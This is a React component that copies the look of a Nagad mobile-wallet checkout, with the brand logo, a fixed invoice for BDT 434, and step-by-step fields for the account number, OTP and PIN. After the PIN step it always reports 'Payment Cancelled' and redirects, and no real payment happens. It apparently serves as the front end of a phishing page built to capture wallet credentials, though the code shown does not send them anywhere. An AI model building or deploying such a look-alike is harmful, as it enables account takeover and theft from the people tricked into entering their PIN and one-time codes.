import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { XCircle } from "lucide-react";
import nagadLogoWhite from "@/assets/nagad-logo-white.png";
import cartIcon from "@/assets/cart-icon.png";

const NagadPayment = () => {
  const navigate = useNavigate();
  const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
  const [showOtpView, setShowOtpView] = useState(false);
  const [showPinView, setShowPinView] = useState(false);
  const [showFailedView, setShowFailedView] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [language, setLanguage] = useState<'bn' | 'en'>('en');

  const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRef = useRef<HTMLInputElement | null>(null);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (showPinView) pinInputRefs.current[0]?.focus();
    else if (showOtpView) otpInputRef.current?.focus();
    else phoneInputRefs.current[0]?.focus();
  }, [showOtpView, showPinView, showFailedView]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const getPhoneNumber = () => phoneDigits.join("");
  const isValidNumber = () => {
    const phone = getPhoneNumber();
    return phone.length === 11 && validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
  };
  const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);
  const isValidPin = () => pinDigits.every(d => d !== "") && pinDigits.join("").length === 4;

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showFailedView && redirectTimer > 0) {
      interval = setInterval(() => setRedirectTimer((prev) => prev - 1), 1000);
    }
    if (showFailedView && redirectTimer === 0) navigate("/");
    return () => clearInterval(interval);
  }, [showFailedView, redirectTimer, navigate]);

  const handleDigitChange = (
    index: number, value: string, digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>, maxLength: number
  ) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < maxLength - 1) refs.current[index + 1]?.focus();
  };

  const handleKeyDown = (
    index: number, e: React.KeyboardEvent<HTMLInputElement>,
    digits: string[], setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) refs.current[index - 1]?.focus();
  };

  const handleConfirm = () => { if (isValidNumber()) setShowOtpView(true); };
  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); } };
  const handlePinConfirm = () => { if (isValidPin()) { setShowPinView(false); setShowFailedView(true); setRedirectTimer(5); } };
  const handleClose = () => navigate("/");

  const renderPhoneInputs = () => {
    const groups = [3, 4, 4];
    let currentIndex = 0;
    const elements: JSX.Element[] = [];
    groups.forEach((groupSize, groupIndex) => {
      const inputs: JSX.Element[] = [];
      for (let i = 0; i < groupSize; i++) {
        const idx = currentIndex + i;
        inputs.push(
          <input key={idx} ref={(el) => (phoneInputRefs.current[idx] = el)}
            type="tel" inputMode="numeric" maxLength={1} value={phoneDigits[idx] || ""}
            onChange={(e) => handleDigitChange(idx, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
            onKeyDown={(e) => handleKeyDown(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
            className="w-10 h-11 bg-white rounded text-center text-gray-800 text-base font-bold focus:outline-none focus:ring-1 focus:ring-white/50"
          />
        );
      }
      elements.push(<div key={groupIndex} className="flex gap-1">{inputs}</div>);
      currentIndex += groupSize;
      if (groupIndex < groups.length - 1) {
        elements.push(<span key={`sep-${groupIndex}`} className="text-white text-xl font-bold mx-1">-</span>);
      }
    });
    return <div className="flex items-center justify-center">{elements}</div>;
  };

  const renderPinInputs = () => (
    <div className="flex items-center justify-center gap-2">
      {pinDigits.map((digit, index) => (
        <input key={index} ref={(el) => (pinInputRefs.current[index] = el)}
          type="password" inputMode="numeric" maxLength={1} value={digit}
          onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
          onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
          className="w-11 h-11 bg-white rounded text-center text-gray-800 text-base font-bold focus:outline-none focus:ring-1 focus:ring-white/50"
        />
      ))}
    </div>
  );

  return (
    <div className="min-h-screen flex flex-col items-center md:p-4 md:bg-gray-200">
      <div className="w-full max-w-md overflow-hidden flex flex-col min-h-screen md:min-h-0 md:h-[90vh] md:rounded-lg"
        style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
        {showFailedView ? (
          <div className="flex-1 flex flex-col items-center justify-center">
            <XCircle className="w-10 h-10 mb-3" style={{ color: '#ccc' }} strokeWidth={1.5} />
            <h3 className="text-center text-sm font-bold mb-1" style={{ color: '#ccc' }}>Payment Cancelled</h3>
            <p className="text-center text-xs font-bold" style={{ color: '#ccc' }}>Redirecting to Merchant Website in {redirectTimer}s</p>
          </div>
        ) : (
          <div className="flex-1 flex flex-col">
            {/* Language Toggle */}
            <div className="flex justify-end p-3">
              <div className="flex rounded overflow-hidden border border-white/30">
                <button onClick={() => setLanguage('bn')}
                  className={`px-3 py-1 text-xs font-bold transition-colors ${language === 'bn' ? 'bg-white/20' : ''}`} style={{ color: '#ccc' }}>বাং</button>
                <button onClick={() => setLanguage('en')}
                  className={`px-3 py-1 text-xs font-bold transition-colors ${language === 'en' ? 'bg-white/20' : ''}`} style={{ color: '#ccc' }}>Eng</button>
              </div>
            </div>

            {/* Cart Icon & Title */}
            <div className="flex flex-col items-center pt-2 pb-4">
              <img src={cartIcon} alt="Cart" className="w-16 h-16 mb-2 object-contain" />
              <h1 className="text-xl font-bold" style={{ color: '#ccc' }}>Easy Payment System</h1>
            </div>

            {/* Invoice Details */}
            <div className="px-6 py-4 space-y-2">
              <div className="flex">
                <span className="font-bold text-sm" style={{ color: '#ccc' }}>Invoice No: &nbsp;</span>
                <span className="text-sm font-bold" style={{ color: '#ccc' }}>B255527202718B</span>
              </div>
              <div className="flex">
                <span className="font-bold text-sm" style={{ color: '#ccc' }}>Total Amount: &nbsp;</span>
                <span className="text-sm font-bold" style={{ color: '#ccc' }}>BDT 434</span>
              </div>
              <div className="flex">
                <span className="font-bold text-sm" style={{ color: '#ccc' }}>Charge: &nbsp;</span>
                <span className="text-sm font-bold" style={{ color: '#ccc' }}>BDT 0</span>
              </div>
            </div>

            <div className="flex-1" />

            {/* Input Section */}
            <div className="px-6 pb-3">
              {showPinView ? (
                <div className="flex flex-col items-center">
                  <p className="text-center text-base font-bold mb-3" style={{ color: '#ccc' }}>Enter PIN</p>
                  {renderPinInputs()}
                </div>
              ) : showOtpView ? (
                <div className="flex flex-col items-center">
                  <p className="text-center text-base font-bold mb-3" style={{ color: '#ccc' }}>Enter Verification Code [OTP]</p>
                  <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                    onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    placeholder="XXX|XXX"
                    className="w-full h-11 bg-white rounded-md text-center text-gray-800 text-base font-bold focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
                  />
                </div>
              ) : (
                <div className="flex flex-col items-center">
                  <p className="text-center text-base font-bold mb-3" style={{ color: '#ccc' }}>Your Nagad Account Number</p>
                  {renderPhoneInputs()}
                </div>
              )}
            </div>

            {/* Terms */}
            <div className="px-6 py-2">
              {!showOtpView && !showPinView && (
                <p className="text-center text-xs font-bold leading-relaxed" style={{ color: '#ccc' }}>
                  By clicking/tapping "Proceed" you are agreeing to our{" "}
                  <span className="underline font-bold" style={{ color: '#ccc' }}>Terms and Conditions</span>
                </p>
              )}
            </div>

            {/* Action Buttons */}
            <div className="px-6 py-4 flex gap-6 justify-center">
              <button
                onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
                disabled={showPinView ? !isValidPin() : showOtpView ? !isValidOtp() : !isValidNumber()}
                className={`px-10 py-2.5 rounded-md text-sm font-bold transition-colors ${
                  (showPinView ? isValidPin() : showOtpView ? isValidOtp() : isValidNumber())
                    ? 'bg-white hover:bg-gray-100' : 'bg-white/70 cursor-not-allowed'
                }`}
                style={{ color: '#8B0000' }}
              >Proceed</button>
              {showOtpView && (
                <button onClick={() => setOtpValue("")}
                  className="px-8 py-2.5 rounded-md text-sm font-bold bg-white hover:bg-gray-100 transition-colors"
                  style={{ color: '#8B0000' }}
                >Resend Code</button>
              )}
              <button onClick={handleClose}
                className="px-10 py-2.5 rounded-md text-sm font-bold bg-white hover:bg-gray-100 transition-colors"
                style={{ color: '#8B0000' }}
              >Close</button>
            </div>

            {/* White Nagad Logo Footer */}
            <div className="flex justify-center py-6 mt-auto">
              <img src={nagadLogoWhite} alt="Nagad" className="h-12 object-contain" />
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default NagadPayment;
